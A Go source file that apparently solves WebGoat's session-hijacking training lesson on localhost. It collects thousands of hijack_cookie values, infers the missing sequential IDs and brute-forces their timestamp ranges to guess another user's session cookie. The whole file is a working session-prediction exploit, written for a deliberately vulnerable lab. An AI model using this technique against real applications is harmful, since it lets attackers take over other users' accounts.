package attacks

import (
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"net/url"
	"regexp"
	"strconv"
	"strings"
)

type session_attack struct {
	requestTemplate http.Request
	sessionData     []string
	attackGuesses   []string
}

type Response struct {
	LessonCompleted bool        `json:"lessonCompleted"`
	Feedback        string      `json:"feedback"`
	Output          interface{} `json:"output"`
	Assignment      string      `json:"assignment"`
	AttemptWasMade  bool        `json:"attemptWasMade"`
}

func (r Response) String() string {
	return fmt.Sprintf("Lesson Completed: %v\nFeedback: %s\nOutput: %v\nAssignment: %s\nAttempt Was Made: %v",
		r.LessonCompleted, r.Feedback, r.Output, r.Assignment, r.AttemptWasMade)
}

func (s session_attack) attack() {
	// fmt.Printf("data %v\n", s.sessionData)
	attemp_size := len(s.attackGuesses)
	client := &http.Client{}
	buf := make([]byte, 4196)
	for i := range s.attackGuesses {
		data := url.Values{}
		data.Set("username", "")
		data.Set("password", "")
		payload := strings.NewReader(data.Encode())

		req, err := http.NewRequest("POST", "http://localhost:8080/WebGoat/HijackSession/login", payload)
		if err != nil {
			fmt.Println("Error creating request:", err)
			return
		}

		// Set the request headers
		req.Header.Set("Host", "localhost:8080")
		req.Header.Set("Referer", "https://localhost:8080/WebGoat/start.mvc")
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
		req.Header.Set("X-Requested-With", "XMLHttpRequest")
		req.Header.Set("Content-Length", "19")
		req.Header.Set("Origin", "https://localhost:8080")
		req.Header.Set("Sec-Fetch-Dest", "empty")
		req.Header.Set("Sec-Fetch-Mode", "cors")
		req.Header.Set("Sec-Fetch-Site", "same-origin")
		cv := fmt.Sprintf("JSESSIONID=mrryeF1FV9IYMF_ZznuxLxtPa0SlGF0BXIbwhLTG; hijack_cookie=%s", s.attackGuesses[i])
		req.Header.Set("Cookie", cv)

		resp, err := client.Do(req)
		if err != nil {
			fmt.Println("Error sending request:", err)
			fmt.Printf("%v", req)
			return
		}
		defer resp.Body.Close()
		resp.Body.Read(buf)
		var v Response
		json.Unmarshal(buf, &v)
		if v.LessonCompleted {
			fmt.Printf("%t %s\n", v.LessonCompleted, s.attackGuesses[i])
			break
		} else {
			if resp.StatusCode == 200 {
				log.Printf("failed attemp %d/%d\n", i+1, attemp_size)
			} else {
				log.Fatalf("failed request %v\n", resp)
			}
		}

	}

}

func A1_session_hijack() {
	s := session_attack{}
	attemps := 20000
	for i := 0; i < attemps; i++ {
		// Code to be executed
		s.collectHijackCookies()
	}

	s.createAttacks()
	s.attack()
}

func (s *session_attack) collectHijackCookies() {
	// Create a new POST request

	data := url.Values{}
	data.Set("username", "")
	data.Set("password", "")
	payload := strings.NewReader(data.Encode())

	req, err := http.NewRequest("POST", "http://localhost:8080/WebGoat/HijackSession/login", payload)
	if err != nil {
		fmt.Println("Error creating request:", err)
		return
	}

	// Set the request headers
	req.Header.Set("Host", "localhost:8080")
	req.Header.Set("Referer", "https://localhost:8080/WebGoat/start.mvc")
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
	req.Header.Set("X-Requested-With", "XMLHttpRequest")
	req.Header.Set("Content-Length", "19")
	req.Header.Set("Origin", "https://localhost:8080")
	req.Header.Set("Cookie", "JSESSIONID=mrryeF1FV9IYMF_ZznuxLxtPa0SlGF0BXIbwhLTG")
	req.Header.Set("Sec-Fetch-Dest", "empty")
	req.Header.Set("Sec-Fetch-Mode", "cors")
	req.Header.Set("Sec-Fetch-Site", "same-origin")

	s.requestTemplate = *req

	client := &http.Client{}

	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Error sending request:", err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		log.Fatalf("failed request %v\n", resp)
	}

	cookie := resp.Header.Get("Set-Cookie")
	re := regexp.MustCompile(`(\d+-\d+)`)
	hijackCookie := re.FindString(cookie)

	// Print the hijack_cookie value
	// fmt.Println("hijack_cookie:", hijackCookie)
	s.sessionData = append(s.sessionData, hijackCookie)
	// buf := make([]byte, 1024)
	// resp.Body.Read(buf)
	// fmt.Println("response:", string(buf))
}

func (s *session_attack) createAttacks() {
	for i := range s.sessionData {
		if i != 0 {
			sessionID, err := strconv.Atoi(strings.Split(s.sessionData[i], "-")[0])
			if err != nil {
				fmt.Println("Error:", err)
				return
			}
			previousSessionId, err := strconv.Atoi(strings.Split(s.sessionData[i-1], "-")[0])
			if err != nil {
				fmt.Println("Error:", err)
				return
			}
			if sessionID != previousSessionId+1 {
				targetSessionId := strconv.Itoa(previousSessionId + 1)
				targetEpochStart, _ := strconv.ParseInt(strings.Split(s.sessionData[i-1], "-")[1], 10, 64)
				targetEpochEnd, _ := strconv.ParseInt(strings.Split(s.sessionData[i], "-")[1], 10, 64)

				for i := targetEpochStart + 1; i < targetEpochEnd; i++ {
					epoch := strconv.FormatInt(i, 10)
					s.attackGuesses = append(s.attackGuesses, strings.Join([]string{targetSessionId, epoch}, "-"))
				}

			}
		}
	}
}
